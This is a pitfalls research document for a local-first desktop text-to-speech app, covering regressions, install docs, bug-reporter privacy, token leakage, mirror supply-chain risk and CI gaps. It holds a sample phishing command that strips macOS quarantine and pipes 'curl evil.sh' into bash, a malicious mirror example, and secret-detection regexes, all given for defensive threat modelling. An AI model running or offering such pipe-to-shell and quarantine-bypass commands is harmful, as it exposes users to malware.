# Pitfalls Research

**Domain:** Stabilization + onboarding milestone for a cross-platform desktop AI app (local-first, multi-engine TTS, Tauri shell, Python ML backend)
**Researched:** 2026-05-16
**Confidence:** HIGH for cross-platform packaging, telemetry/PII, supply-chain, and Gatekeeper specifics (verified against multiple official sources). MEDIUM for the in-app bug-reporter rate-limiting math and Supertonic-3 specific licensing (only one or two corroborating sources).

---

## Critical Pitfalls

These are the failure modes that can blow up a stabilization milestone or violate the local-first guarantee. Each maps to a wave in `PROJECT.md`.

---

### Pitfall 1: The Fix-Regression Cycle (stabilization's central failure mode)

**What goes wrong:**
A bug fix for issue #N inadvertently breaks something that was working — most commonly because the fix touches a code path that's shared with already-installed engine adapters, on-disk model state, or one platform's quirks. Users on `v0.3.2` find they can no longer load a voice that worked in `v0.3.1`. The "stability pass" creates a new wave of stability complaints.

**Why it happens (specific to this project):**
- The TTS backend registry (`backend/services/tts_backend.py`) is plugin-style with six engines already loaded; a fix for IndexTTS isolation (#42) can shift import order and accidentally break MLX-Audio detection.
- `omnivoice_data/` carries user voices and a SQLite DB. A "harmless" alembic migration in Wave 2 can render an existing user's projects unloadable.
- CI (`ci.yml`) runs pytest + frontend tests on `ubuntu-22.04` only; Tauri `cargo check` runs cross-platform but does NOT exercise the runtime venv bootstrap, model download, or engine import paths. The fix can pass CI and still break Windows or macOS users.

**How to avoid:**
- **Mandate a "regression budget" per wave:** target zero net new issues in the wave. If Wave 2 closes 5 issues and opens 3, the wave is not done.
- **Snapshot a pre-milestone `omnivoice_data/` fixture** and add a smoke test that loads it after every PR. Use a real user-style payload (1 voice profile, 1 dub project, 1 prefs row) — not synthetic.
- **Add a "touched engines" PR checklist** — if a PR modifies `tts_backend.py`, the PR author must list which engines they manually loaded post-change. Do this in the PR template, not as a hope.
- **Two-RC cadence per wave:** ship Wave 1 as `v0.3.0-rc1`, sit for 48h with Discord watching, only tag `v0.3.0` after no new install reports. Repeat per wave.

**Warning signs:**
- An issue that says "this used to work in 0.2.7" appearing within 72h of a release.
- The `total open issues` count holding steady or rising while you close issues — the inbox is leaking.
- Stack traces in user reports pointing to code touched in the current milestone.

**Phase to address:** Cross-cutting — applies to **all waves**. Strongest in Wave 2 (Stability pass) where most engine code is touched.

**Severity:** **blocks-milestone** — this is the failure mode that turns a stabilization milestone into a destabilization milestone.

### Pitfall 2: Installation Tutorial Bit-Rot (the "macOS dev writes Linux docs" failure)

**What goes wrong:**
Install docs are written, validated once on the author's machine, and immediately start rotting. Specific failure modes for this app:
1. Linux instructions written by macOS developers say `apt install ffmpeg` but the Fedora 44 user (issue #56's reporter) needs `dnf install ffmpeg` — and gets `command not found` on step 1.
2. `xattr -cr` instructions list `/Applications/OmniVoice Studio.app` but Sequoia users who installed to `~/Applications/` get "No such file or directory" and rage-quit.
3. The "open localhost:3900" step assumes IPv4 is bound; some Windows users get IPv6-only resolution and see `ECONNREFUSED`.
4. Version-specific URLs (`OmniVoice.Studio_0.2.7_aarch64.dmg`) in README point to dead releases two weeks after `v0.3.0` ships.
5. The README's `bun run dev` flow assumes the user has Bun + uv + ffmpeg pre-installed; CONTRIBUTING.md lists them as prerequisites but the README does not.

**Why it happens (specific to this project):**
- The team's primary dev environment is macOS Apple Silicon (inferred from `macos-14` being the CI host and Apple Silicon being the only macOS DMG shipped). Linux validation is one-shot per release.
- README has version numbers hard-coded in download badges (lines 25–28); these are not regenerated on release.
- Three install paths (Desktop / Docker / From source) with three OSes each = 9 happy paths to keep current. Realistically only 1–2 are validated per release.
- AppImage on Fedora 44 vs Ubuntu 24.04 vs Debian stable behave differently for webkit2gtk versions; "Linux" is not one platform.

**How to avoid:**
- **Generate, don't hand-write, version-sensitive URLs.** Move download badges to a templated section regenerated by the release workflow (sed against a `VERSION` env var) so 0.3.x never points to 0.2.7 dead links.
- **Add a "tested on" matrix at the top of the install tutorial:** "Last validated on: macOS Sequoia 15.2 (M2), Windows 11 23H2 (x64), Ubuntu 24.04 LTS, Fedora 44." Date-stamp it. If the date is >90 days old, the doc gets a "may be stale" banner via a check-doc-freshness CI job.
- **Three docs, not one:** `docs/install-macos.md`, `docs/install-windows.md`, `docs/install-linux.md`. Cross-link from README. Each has the platform's specific commands (apt + dnf + zypper for Linux), specific error messages, specific paths.
- **Solicit Linux + Windows reviewers explicitly** for the install tutorial PR. Don't merge until at least one non-macOS contributor has validated end-to-end on a clean VM.
- **"Boot a clean VM and follow the docs" exercise** before each `v0.3.x` ship. UTM (free, macOS-native) for Linux. Parallels free trial or Hyper-V for Windows. Time-box to 30 minutes.

**Warning signs:**
- Discord traffic about install spikes within 48h of a release.
- The same "step N doesn't work" question from two different users in one week.
- Issue reporter's OS is consistently absent from the Validated section of `PROJECT.md`.

**Phase to address:** **Wave 3 (Onboarding & docs)** is the primary owner, but Wave 1 must fix the download-badge version-pinning problem because that breaks docs the day Wave 1 ships.

**Severity:** **degrades-quality** — directly defeats the stated Core Value ("a first-run that actually works").

### Pitfall 3: Auto Bug Reporter PII Leakage (the local-first promise killer)

**What goes wrong:**
The opt-in auto bug reporter captures logs, sysinfo, and Python tracebacks — and accidentally captures any of the following:
1. **The user's HF_TOKEN** (env var dumps in tracebacks if they `print(os.environ)` anywhere, or in `pyannote`/`huggingface_hub` "401 unauthorized" error strings that include the token in the URL).
2. **File paths revealing identity** — `/Users/jassycreatine/Desktop/voice-design/...` exposes a real Gmail handle to a public GitHub issue, scrapable forever.
3. **User-generated content** — text being synthesized may be private (legal docs, personal scripts). A traceback during TTS generation can include the input text in the local variables of a Python exception frame.
4. **Audio file paths and contents** — `librosa.load("/path/to/private-recording.wav")` failures put filename in the report; nothing prevents a future bug from dumping waveform bytes into a log line.
5. **Local IP, hostname, and macOS computer name** ("jassy's MacBook Pro") which `socket.gethostname()` returns by default on macOS.

If even one PII leak lands on a public GitHub issue, the local-first brand is dead. Sentry's playbook is informative here: stack traces in Python and PHP expose runtime variable values, not just code — so a "send the traceback" reporter sends user data by default.

**Why it happens:**
- Default Python tracebacks include `locals()` if `traceback.format_exc(chain=True)` is used with rich formatting.
- HuggingFace `huggingface_hub` library has historically embedded tokens in error messages for 401 responses.
- Developers building bug reporters test on synthetic data, so PII leakage is invisible until a real user hits it.
- The Tauri side has access to the full OS — system username, hostname, locale, and any env var.

**How to avoid:**
- **Default-deny payload:** the bug reporter ships an explicit allow-list of fields (`os`, `version`, `gpu_type`, `python_version`, `engine_id`, `error_class`, `error_message_first_line`). Anything else is dropped at the boundary, not redacted.
- **Path sanitizer at submission boundary** — replace `/Users/<name>/`, `/home/<name>/`, `C:\Users\<name>\` with `<USER_HOME>/` before serialization. Use a single chokepoint function tested against a fixture of known patterns.
- **Token regex scrub** — block payloads containing `hf_[a-zA-Z0-9]{34,}`, `sk-[a-zA-Z0-9]{20,}` (any future API key shape), `Bearer [A-Za-z0-9._-]+`, and obvious cookie patterns. If matched, drop the entire field and replace with `[REDACTED:token-pattern-detected]`.
- **No `locals()` in tracebacks.** Configure the bug reporter to use bare `traceback.format_exception(type, value, tb)` — no `repr(local)` dumps.
- **Two-step consent UX:** first dialog asks "send a bug report?" (yes/no). Second screen shows the exact payload as JSON, with "Send" and "Cancel". User cannot configure "always send" until after they've inspected at least one payload. GDPR-aligned and prevents any field surprising them.
- **No automatic submission ever.** Even with opt-in: every submission is one explicit click per report. "Background telemetry" is out of scope per `PROJECT.md` local-first constraint.
- **Per-payload preview** — the JSON shown in step 2 is the literal bytes that will be POSTed. No "we'll add some metadata server-side."

**Warning signs:**
- Any PR adding bug-reporter code that doesn't include a fixture test asserting redaction.
- A `to_dict()` or `model_dump()` call in the reporter path on any object that wasn't authored specifically for it.
- The phrase "we can always scrub on the server" in code review.

**Phase to address:** **Wave 3 (additions — auto bug reporting)**. Build the redaction layer first, the submission UI second.

**Severity:** **blocks-milestone** — violates the local-first guarantee in `PROJECT.md` constraints if it ships broken.

### Pitfall 4: Bug Reporter Self-DDoS / GitHub Rate-Limit Burn

**What goes wrong:**
A bug in the bug reporter (or in a code path it monitors) causes the reporter to fire repeatedly. Two specific failure modes:
1. **Feedback loop:** the reporter itself throws an exception during submission, that exception is captured by the same handler, which tries to report it, which fails, which captures again. The Cloudflare dashboard outage (a React `useEffect` whose dependency was a recreated object) and Twitter's 2023 rate-limit incident are the canonical examples.
2. **One bug → 100 users → 1000 reports/min** to GitHub's unauthenticated issue-creation API. GitHub's REST API allows ~5000 authenticated requests/hour or 60 unauthenticated/hour per IP. If the reporter uses a single shared GitHub App token, the project's whole CI + automation pipeline gets rate-limited at the same time the user storm hits.
3. **Issue spam:** the same crash from 500 users opens 500 separate issues. Triage drowns; real new issues are buried.

**Why it happens (specific to this project):**
- This is the first iteration of the reporter — easy to get the loop guards wrong.
- The project is explicitly framed as "Empty the inbox" — a flood of auto-issues makes that metric impossible to read.
- Local-first constraint says submission must go to GitHub Issues directly (no intermediary) — so there is no server-side aggregation layer to absorb a storm.

**How to avoid:**
- **Recursion guard inside the reporter** — set a thread-local flag at submission entry; if entered while flag is set, drop silently. Standard Sentry pattern.
- **Client-side rate limit:** hard cap of N reports per user-day (default 3). Persist counter in `omnivoice_data/.bug-report-counter.json` keyed by date. Day rolls over → reset. User cannot send a 4th without manually clearing the counter (or it's locked out until next day).
- **Client-side deduplication:** hash `error_class + first_frame_file + first_frame_line` → SHA-1; if reporter has already sent this hash today, surface "you already reported this — track it at <URL>" instead of opening a new issue.
- **Search GitHub before opening:** the reporter queries `gh issues list --search "<error_message_first_line>"` (via GitHub REST, with `User-Agent: OmniVoice-BugReporter/0.3`); if a matching open issue exists, surface "Comment on existing issue?" instead of "Open new issue?".
- **Backoff on 403/429 from GitHub** — exponential 1s → 60s → give up, with a UI message ("GitHub is throttling reports; please try later").
- **`auto-report` label** on every reporter-filed issue so triagers can filter them. Manual reports stay unlabeled and surface normally.

**Warning signs:**
- During internal QA: trigger any error 5 times in a row; verify only 1 report is sent and the rest are deduped.
- During first week post-release: GitHub Issues sidebar shows >10 issues per day with the `auto-report` label.
- A single error fingerprint appears in >5 reports — the dedupe is broken.

**Phase to address:** **Wave 3 (additions — auto bug reporting)** — must ship with rate-limiting on day 1, not as a v0.3.x+1 hotfix.

**Severity:** **blocks-milestone** for the bug-reporter feature; **degrades-quality** for the rest of the milestone (drowns the inbox you're trying to empty).

### Pitfall 5: HF Token Leakage Across the Stack

**What goes wrong:**
The HF token persistence work (Wave 2) creates three new leak vectors that compound the existing one:
1. **Doc copy-paste leakage:** "Set HF_TOKEN=hf_abc123..." example in the new HF token setup guide is too realistic; a user pastes it as-is, commits, and TruffleHog auto-scans GitHub within minutes.
2. **Bug-report leakage:** a user with a working HF token hits an unrelated bug; the auto-reporter (Pitfall 3) dumps `os.environ` or a `huggingface_hub` traceback containing the token in URL.
3. **Log file leakage:** Settings → Logs (screenshot in README) shows logs including the token if `pyannote` logs the failed-auth request URL. User screenshots the logs to post in Discord. Token leaks to a screenshot in a public channel.
4. **Token expiry undetected:** HF tokens issued before 2024 don't expire, but new fine-grained tokens (post-2024) can have expirations. The app stores a token in env, doesn't notice it's expired, and surfaces "model download failed" instead of "your token expired — refresh at <URL>."
5. **Persistence to wrong shell:** the setup guide picks `~/.bashrc` but the user runs `zsh`; persistence doesn't survive. They re-add the token to `~/.zshrc` once, and a session later it's gone again because they're now on `~/.zprofile` for login shells. (macOS Catalina+ defaults to zsh.)

**Why it happens:**
- HF tokens are one of the most-commonly-leaked credential types on GitHub per Snyk's State of Secrets 2025; Hugging Face partnered with TruffleHog specifically because of how often these tokens land in commits.
- Shell-rc files are a notorious foot-gun across macOS, Linux, and WSL — `~/.bashrc` vs `~/.bash_profile` vs `~/.zshrc` vs `~/.profile` semantics differ.
- The HF Hub library historically embedded tokens in 401 error messages.

**How to avoid:**
- **Token-shaped placeholder, never real-looking:** docs always show `HF_TOKEN=hf_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` (exactly the right length pattern but obviously fake). Add a GitHub secret-scanning push-protection rule so even a doc PR containing a real-shape token is blocked.
- **Detect HF tokens in logs** — any line matching `hf_[A-Za-z0-9]{34,}` in the backend logger output gets the match replaced with `hf_<REDACTED>`. This applies to Settings → Logs UI also.
- **Detect expired tokens proactively** — on startup, hit `https://huggingface.co/api/whoami-v2` with the token; if 401, surface "Your HF token is expired — refresh at <URL>" in the UI, don't wait for a model download to fail mid-job.
- **Multi-shell HF setup guide:** the new guide (Wave 3) explicitly covers `~/.zshrc` (macOS default), `~/.bashrc` + `~/.bash_profile` (Linux), `setx HF_TOKEN ...` (Windows persistent), AND PowerShell `[Environment]::SetEnvironmentVariable("HF_TOKEN", ..., "User")`. Include a `bin/check-hf-token` script the user can run to confirm it's loaded.
- **Prefer Tauri-managed token storage** over shell env vars where possible — store in the Tauri keychain integration (`tauri-plugin-stronghold` or platform keyring), surface via Settings → HF Token. Shell env-var is fallback for headless/CLI users only.
- **In bug reporter:** explicit `env_blocklist = ["HF_TOKEN", "HUGGING_FACE_HUB_TOKEN", "HF_HUB_TOKEN", ...]` and the env dump is fully off by default anyway (per Pitfall 3's allow-list approach).

**Warning signs:**
- Real-looking token strings appearing in PR diffs to docs/.
- Any user asking on Discord "I posted my token in your logs, can you delete it?" — at that point it's already in indexed search results.
- `pyannote` or `huggingface_hub` log lines in user-pasted reports containing `hf_...`.

**Phase to address:** **Wave 2 (HF token persistence fix)** for storage + expiry detection; **Wave 3 (docs + bug reporter)** for leak prevention in those surfaces.

**Severity:** **degrades-quality** in normal case; **blocks-milestone** if token actively leaks through bug reporter (because that recursively breaks the local-first guarantee).

### Pitfall 6: Mirror Fallback as a Supply-Chain Attack Vector

**What goes wrong:**
The Wave 2 fix for restricted networks (#60, #57) adds Python mirror fallback for `uv venv`. Three concrete attack surfaces:
1. **Arbitrary `--index-url` configurability:** if the UI exposes "Python mirror URL" as a freeform text field, an attacker can social-engineer a CIS-region user ("hey use this fast mirror at `https://pypi.evil.ru/`") and they pull malicious wheels for `pyannote`, `whisperx`, or any dependency.
2. **Typosquatting on the mirror itself:** the Checkmarx 2024 incident used `files.pypihosted.org` (typo of legit `files.pythonhosted.org`) to deliver malicious packages to >170k users. If our default mirror list is hand-curated and one entry has a typo, every restricted-network user is compromised.
3. **Mirror serves different bytes than PyPI:** even a legit-looking mirror can be compromised mid-flight. Without hash pinning, `uv` happily accepts whatever the mirror serves.
4. **No revocation path:** if a mirror is compromised, every shipped `v0.3.x` with that mirror in its allow-list keeps pulling poisoned wheels until the user manually updates.

**Why it happens:**
- The user need is real — Russia/CIS users genuinely can't reach `pypi.org`.
- The convenient fix is `index-url = "<some-mirror>"` in a config; the secure fix is much more work (lockfile + hash pinning + allow-list).
- `uv` does support hash verification (via `uv.lock`) but mirror configs can override this if not done carefully.

**How to avoid:**
- **Hash-pinned `uv.lock` is non-negotiable.** Already in repo. Verify the `uv sync` path on first launch always uses `--frozen` (which it does per `release.yml` lib.rs comment). The mirror fallback must reuse the lockfile's hashes, not just blindly trust the mirror's bytes.
- **Allow-list, not freeform:** the UI offers a fixed dropdown of known-trusted mirrors:
  - Default: `pypi.org`
  - Yandex: `https://pypi.yandex.ru/` (verify still active)
  - Tsinghua: `https://pypi.tuna.tsinghua.edu.cn/simple`
  - Aliyun: `https://mirrors.aliyun.com/pypi/simple/`
  No freeform "enter your own" field in the UI. (Power users can edit a config file, which makes attack require local access.)
- **TLS pinning on mirror hosts** — `uv` already validates TLS certs; ensure `INSECURE_HOST` is never in any default config we ship.
- **First-launch warning UI:** if a non-default mirror is selected, surface "You're using a third-party Python mirror. Packages will be verified against `uv.lock` hashes, but if those hashes are tampered with, you should reset." Link to docs explaining the threat.
- **Subscribe to PyPI's malicious-package advisories** (or use `safety check` / `pip-audit` in CI on `uv.lock`) so we know if a pinned package is later marked malicious.
- **Document the threat model** in the mirror-config docs page: explicitly say "do not enter mirror URLs from Discord/Telegram unless you verify them."

**Warning signs:**
- A PR that adds `--allow-insecure-host` or `INSECURE_HOST` for any reason.
- A PR adding a mirror URL without a corresponding TLS verification check.
- The mirror selector UI accepts arbitrary URLs.
- The lockfile is regenerated on user machine instead of shipped frozen.

**Phase to address:** **Wave 2 (Python mirror fallback)** — must design for security from day 1; retrofitting hash pinning after release is hard.

**Severity:** **blocks-milestone** — supply-chain compromise of a desktop AI tool that runs arbitrary Python code is an existential brand risk.

### Pitfall 7: Supertonic-3 Engine Integration Cascade

**What goes wrong:**
Adding Supertonic-3 (`Supertone/supertonic-3`) as a new TTS engine breaks one or more of the existing six engines. Specific failure modes from looking at how Coqui/XTTS, MLX-Audio, etc. behave when stacked:
1. **Transformers version conflict:** Supertonic-3 may require a `transformers>=4.50` while CosyVoice 3 needs `<=4.48`. `uv sync` either picks the wrong one (silent breakage of CosyVoice) or fails entirely (everyone loses).
2. **Tokenizer cache poisoning:** different HF tokenizer versions write incompatible cache formats to `~/.cache/huggingface/`. Loading Supertonic-3 once corrupts the cache for VoxCPM2 the next load.
3. **CUDA version mismatch:** Supertonic-3 may ship with CUDA 12.x kernels; existing engines pinned to CUDA 11.8 (cuDNN 8 compat mentioned in README). User upgrades, GPU works for Supertonic-3, OmniVoice default engine OOMs or silently runs CPU.
4. **Weight download size:** Supertonic-3 ships several-GB model weights from HF. First-launch experience (already 4 GB per README's Docker docs) balloons to 8+ GB without a heads-up. Users on slow links assume the app hung.
5. **Licensing surprise:** the Supertonic-3 model card may have restrictive terms (research-only, non-commercial, attribution required). Shipping it as a built-in engine without surfacing the license breaks user trust and possibly the project's own FSL license model.
6. **Apple Silicon vs CUDA vs CPU coverage gaps:** Supertonic-3 might be CUDA-only or PyTorch-only; if it doesn't have an MPS path, macOS users get a confusing "available" engine that always falls back to slow CPU.
7. **First-run model download blocks the UI thread** — pattern in the engine registry needs to be: download asynchronously, surface progress in Settings → Models, not "user clicks Generate, app freezes for 4 minutes."

**Why it happens (specific to this project):**
- The TTS backend has six engines already and adding a seventh exponentially increases the dependency-conflict surface.
- `tts_backend.py` registry pattern relies on `is_available()` import probes — these don't surface dep-conflict errors clearly; they just return "not available."
- Constraint in `PROJECT.md`: "Users with already-installed engines must not have to reinstall." Adding a new engine that conflicts violates this.
- README is explicit: "Each release converts to Apache 2.0 two years after publication" — license conflicts with engine model cards have downstream legal implications.

**How to avoid:**
- **Verify model card licensing BEFORE writing code** — read https://huggingface.co/Supertone/supertonic-3 model card and LICENSE; if non-commercial or research-only, surface in `display_name` ("Supertonic-3 (research only)") and in Settings → TTS Engine with a disclaimer. If incompatible with FSL/Apache redistribution, add as optional opt-in, not bundled.
- **Isolate dep installation:** Supertonic-3's deps go in an `[project.optional-dependencies] supertonic = [...]` group in `pyproject.toml`, NOT in main deps. `is_available()` checks for the optional group. Existing users get nothing forced on them.
- **Dependency resolution sanity check:** before merging, run `uv lock --check` with Supertonic-3 deps added and verify no existing engine's pin moves. If it does, this is the warning sign.
- **Hash-locked weight URLs** — when the engine downloads weights from HF, pin the model revision (commit SHA, not `main`). Prevents the engine breaking next week when Supertone pushes an update.
- **Model size warning UX:** before first generation, show "Supertonic-3 needs ~X GB download. Continue?" Track download in Settings → Models with cancellable progress.
- **Platform-availability matrix in `is_available()`** — explicitly return `(False, "Supertonic-3 requires CUDA 12+ or Apple Silicon MPS")` on unsupported platforms instead of crashing on import.
- **Smoke test:** spin up a clean install, install all 7 engines, run one synthesis on each. CI matrix runs `is_available()` for all engines on all 3 OSes (cheap, fast).
- **Tokenizer cache namespacing** — if HF cache conflicts surface, set `HF_HOME=<omnivoice_data>/hf-cache-supertonic` per-engine to isolate. Costs disk, buys safety.

**Warning signs:**
- `uv lock` output shows version bumps to packages outside Supertonic-3's direct deps.
- Existing engines fail `is_available()` after Supertonic-3 is installed in the same venv.
- The model card on HF has a non-OSI license tag.
- The HF repo has commits within the last 30 days (model is still in flux — pinning is critical).

**Phase to address:** **Wave 3 (additions — Supertonic-3)**. Must follow the existing engine isolation work (Wave 2 IndexTTS #42) so the pattern is in place.

**Severity:** **degrades-quality** for normal user; **blocks-milestone** if it breaks existing engines (violates explicit constraint in `PROJECT.md`).

### Pitfall 8: The `xattr -cr` Documentation as a Phishing Vector

**What goes wrong:**
The README workaround `xattr -cr /Applications/OmniVoice\ Studio.app` is a real solution to the macOS Sequoia "damaged" issue. But documenting it teaches users a dangerous habit:
1. **Phishing copy-paste:** an attacker posts a tutorial "to fix OmniVoice on macOS, run `xattr -cr /Applications/ && curl evil.sh | bash`" — user has already been trained that copy-pasting `xattr -cr` commands from random docs is normal.
2. **Cargo-cult application:** users start running `xattr -cr` on every "damaged" app they download, including actually-malicious ones.
3. **Apple Security writeups treat removal of `com.apple.quarantine` as a defense-evasion technique** (Elastic and others have detection rules around it). Teaching users to do this routinely makes them less safe overall.
4. **Brand association:** if a fake "OmniVoice" malware sample is later distributed, the legit docs already pre-trained users to disable Gatekeeper. Attackers thank you.

**Why it happens:**
- Real signing requires Apple Developer Account ($99/yr) + notarization pipeline; `PROJECT.md` explicitly defers this to a future milestone.
- The user pain is immediate; the security teaching damage is gradual.

**How to avoid:**
- **Frame the workaround precisely:** in README, don't bury it in a `<details>`. Lead with a short paragraph: "macOS quarantines unsigned apps. To verify the app you downloaded is real, check its SHA-256 against the value on the GitHub Releases page first." Then provide the `xattr` command. Link to the release with the checksum.
- **Publish SHA-256 checksums for every release artifact** in the GitHub Release body. (Tauri-action does this for updater payloads but worth confirming for DMG.) Users can verify before bypassing.
- **Surface an in-app error UX** for the case where the user double-clicks the DMG and the app refuses to open: "If you saw 'app is damaged': verify the SHA-256 matches the releases page, then run `xattr -cr ...`. [Copy verified command]." Pre-populated path = harder to phish.
- **Time-box the workaround:** Add a tracking issue ("ship real notarization by milestone X") so the workaround is not the permanent answer. `PROJECT.md` already flags this as out of scope; explicit issue keeps it visible.
- **Never tell users to disable Gatekeeper globally** (`spctl --master-disable`). The workaround is per-app `xattr`, scoped to one file. Be explicit about this in docs.
- **Don't use `sudo`** in the documented command unless required — `xattr -cr` doesn't need sudo for apps in `/Applications/` that the current user installed.

**Warning signs:**
- Anyone in Discord pasting `xattr -cr` commands that include URLs or pipe to `bash`.
- A Discord/Reddit message attributed to OmniVoice telling users to disable Gatekeeper globally.
- The README workaround example using a different format than the in-app error message — users can't tell which is "the real" command.

**Phase to address:** **Wave 1 (xattr workaround docs)** — the docs ship with the workaround; the SHA-256 + in-app error context is the prevention layer.

**Severity:** **degrades-quality** alone, but the consequences (a fake OmniVoice malware sample exploiting the trained behavior) would be brand-existential. Treat the docs framing seriously.

### Pitfall 9: WEBKIT_DISABLE_COMPOSITING_MODE Performance Regression

**What goes wrong:**
The Wave 1 workaround for AppImage white-screen (#56 on Fedora 44 / Ubuntu 24.04) sets `WEBKIT_DISABLE_COMPOSITING_MODE=1` in the launcher. This forces software rendering — which:
1. **Cripples animation performance** on the React frontend's waveform timeline and glassmorphism UI (per README screenshots: timeline scrubbing, dub progress animations). Users see laggy 5-fps UI.
2. **Disables WebGL/canvas hardware accel** — anything in the frontend doing waveform rendering or batch progress charts goes to CPU.
3. **Applied unconditionally** — users on Intel/AMD GPUs without the NVIDIA bug pay the perf cost forever for a bug they don't have. Per the upstream Tauri bug #9394 + #13151 trail, the white screen is overwhelmingly an NVIDIA proprietary driver issue.
4. **No detection of when the workaround is no longer needed:** when WebKitGTK ships a fix (or NVIDIA drivers do), the env var stays set and users keep paying the perf tax.

**Why it happens:**
- Cargo-cult applied as "always-on" because it's the safest documented fix.
- AppImage launcher script (typically `.desktop` file `Exec=` line) is set-and-forget.
- No telemetry to know what GPU the user has (per local-first constraint).

**How to avoid:**
- **Detect the failure case, don't blanket-apply:** the AppImage wrapper script first attempts to detect NVIDIA proprietary driver. Heuristic: `glxinfo | grep -q "NVIDIA Corporation"` OR `lsmod | grep -q nvidia_drm`. Only set `WEBKIT_DISABLE_COMPOSITING_MODE=1` if NVIDIA detected. Non-NVIDIA users get full perf.
- **Try alternative env vars in order:** the Tauri community thread (issue #9394) lists `WEBKIT_DISABLE_DMABUF_RENDERER=1` and `__NV_DISABLE_EXPLICIT_SYNC=1` as less-invasive options. Try DMA-BUF disable first (only affects newer renderer path), fall back to full composition disable only if needed.
- **Surface the workaround in UI:** Settings → Diagnostics shows "Running with: software rendering (NVIDIA workaround)." Users on AMD/Intel who see this know it's wrong; can manually unset.
- **Annual review:** tracking issue revisits whether the upstream fix is shipped. WebKitGTK 2.46+ has fixes; Fedora 44/Ubuntu 24.04 may already have moved.
- **Document the perf tradeoff** so users have informed consent: "If your UI feels slow, comment out the env var in the .desktop file — but the white-screen bug will return if you're on NVIDIA proprietary."
- **Test both paths in CI:** spin up an AppImage in a GitHub Actions Linux runner, run both with and without the env var, take a screenshot, diff. Catches accidental regressions in the wrapper script.

**Warning signs:**
- A user reports "UI is laggy" on a non-NVIDIA AppImage install.
- The workaround is still in the launcher 6 months from now without a tracking-issue check-in.
- The Settings → Diagnostics shows the workaround active on a system where it's not needed.

**Phase to address:** **Wave 1 (AppImage workaround docs)** — ship with detection, not blanket-apply.

**Severity:** **degrades-quality** — silently slow UI hurts the "first run that works" promise; users may attribute to general app slowness instead of the workaround.

### Pitfall 10: Cross-Platform Test Coverage Theater

**What goes wrong:**
The team thinks "we test cross-platform" because `ci.yml` has a matrix and `tauri-cross-platform` runs `cargo check` on all three OSes. But:
1. **`cargo check` doesn't link or run** — it catches type/cfg errors only. Runtime issues (missing system libs, dynamic loader path bugs, ffmpeg invocations) all pass CI.
2. **No CI runs the actual Python backend on macOS or Windows** (lines 22–24 in ci.yml: only `ubuntu-22.04`). The "Stability pass — DB leaks, App.jsx hooks refactor, desktop bootstrap" from PR #49 was Linux-validated only; users on macOS Sequoia may still see DB leaks from a path-handling bug nobody saw.
3. **No CI exercises the first-launch venv bootstrap** — `release.yml` builds the installer but doesn't run it. The runtime `uv sync --frozen` path is entirely untested.
4. **No GUI smoke test** — nothing clicks "Generate" and checks audio comes out.
5. **Windows-specific gotchas (long paths, antivirus blocking, MSVCR140.dll missing) cannot be caught by Linux-only tests.**

**Why it happens:**
- macOS and Windows runner minutes are expensive (10x Linux on GitHub).
- "Tauri-action handles cross-platform" — yes, for *building*, not for *runtime validation*.
- Manual testing is non-uniform; whoever has the relevant hardware does it.

**How to avoid:**
- **Add macOS + Windows runtime smoke tests to CI** (not just `cargo check`):
  - `runs-on: macos-14` step: `uv sync && uv run python -c "import backend; from backend.services.tts_backend import _REGISTRY; print(list(_REGISTRY.keys()))"`. Catches Python-on-macOS import path bugs.
  - Same on `runs-on: windows-2022`. Catches Windows path separator bugs (the kind that caused the symlink/Triton issues already in the codebase).
  - Cost: ~3 minutes per OS, runs on every PR. Worth it.
- **Add an installer smoke test** in `release.yml` — after building each platform's bundle, on the same runner: install/extract → launch → wait 30s → curl `localhost:3900/health` → kill. Catches "the bundle is broken on first launch" bugs that would otherwise hit users.
- **Frontend test on cross-platform runners** — currently `bunx vitest run` runs only on Linux. The vitest suite (per `ci.yml` line 92) is small and could run on all 3 OSes for ~30s extra.
- **Use UTM (macOS host) + Hyper-V (Windows) + Multipass (Linux) for local dev VMs** when CI isn't enough. Document this in CONTRIBUTING.md so maintainers can reproduce reported issues without owning hardware.
- **Make a "tested OS matrix" badge in README** — auto-updated by CI, shows which OSes were validated for the current shipped version. Honesty.
- **Beta channel for high-risk changes:** before promoting `v0.3.x` to "latest" release, mark it `prerelease: true` for 48h. Users who opt in catch the bugs CI missed.

**Warning signs:**
- A bug report's OS doesn't match anything in CI's matrix → that platform is uncovered.
- A "fix" in Wave 2 has only Linux test coverage but touches `lib.rs` (Tauri Rust, platform-conditional).
- The CI run for a PR is green and the merge breaks Windows within 24h.

**Phase to address:** **Cross-cutting — needs to be in place before Wave 2** starts. Most stability fixes touch platform-specific code paths.

**Severity:** **blocks-milestone** for cross-platform parity (an explicit `PROJECT.md` constraint).

### Pitfall 11: "Empty the Inbox" as a Goodhart's-Law Trap

**What goes wrong:**
The milestone is framed as closing 11 open issues. Per Goodhart's Law: "when a measure becomes a target, it ceases to be a good measure." Specific failures:
1. **Triage gaming:** to make the metric look good, easy issues get prioritized over hard ones (#54 macOS signing — counted as closed via documented `xattr` workaround per the `PROJECT.md` "Key Decisions" table — but the user still has a broken first-run, just with docs).
2. **Issue-closing without resolution:** "fixed in next release, please reopen if it happens" on issues you didn't actually fix. Inflates the metric, frustrates users.
3. **Hidden-issue accumulation:** while you're closing the 11 in the inbox, 7 new ones come in. Net inbox stays at 11 but the "11 closed" headline reads like a win.
4. **Anti-feature pressure:** an issue says "add 50 new TTS engines"; closing it as "won't do" is correct per `PROJECT.md` (out of scope) but feels like a metric loss.
5. **The wrong issues:** a Discord-volume issue (HF token setup, the most common Discord complaint per `PROJECT.md` user feedback themes) may not be in the 11 — and closing the 11 doesn't reduce Discord volume.
6. **"Fixes that introduce bugs" double-count badly** — closes 1 issue, opens 2 → inbox grows but the spreadsheet shows progress.

**Why it happens:**
- The decision was explicit: user picked "Empty the inbox" over "trustworthy v0.3.0 release." Concrete metric is appealing precisely because it's measurable.
- Open-source-maintainer literature (Mozilla research per the Goodhart's-law search) is clear: responsiveness matters more than closure count.

**How to avoid:**
- **Track two metrics, not one:**
  - **Primary:** weighted issue closure (each closed issue contributes by its impact-label weight; "critical" = 5×, "minor" = 1×). Discourages closing trivial issues to game count.
  - **Secondary:** net inbox change (open at milestone start − open at milestone end). Discord-driven new issues count against the metric. Honest measure of whether stability improved.
- **Define "closed" rigorously per `PROJECT.md` key decisions:** "documented workaround" is OK only for #54 + #56 (explicit decision); every other close requires either code fix shipped or "won't do, here's why" with user acknowledgment.
- **Track Discord volume independently:** count Discord help-channel messages for the 30 days before vs after milestone ship. Real signal that onboarding pain dropped.
